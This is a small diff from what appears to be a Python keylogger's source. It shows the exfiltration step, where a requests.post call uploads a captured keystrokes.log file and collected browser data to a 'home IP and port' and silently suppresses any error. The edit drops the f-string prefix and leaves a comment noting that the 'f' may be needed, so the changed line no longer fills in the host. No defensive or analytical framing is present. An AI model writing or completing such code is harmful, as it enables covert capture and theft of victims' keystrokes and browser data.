@@ -48,7 +48,7 @@ with keyboard.Listener(on_press=on_press) as listener:
 
     # Send the gathered data to the home IP and port
     try:
-        requests.post(f"http://{home_ip}:{port}/upload", files={'keystrokes.log': open('keystrokes.log', 'rb'), 'browser_data.txt': browser_data})
+        requests.post("http://{home_ip}:{port}/upload", files={'keystrokes.log': open('keystrokes.log', 'rb'), 'browser_data.txt': browser_data}) ##may need f before the "http"
     except Exception as e:
         pass
 
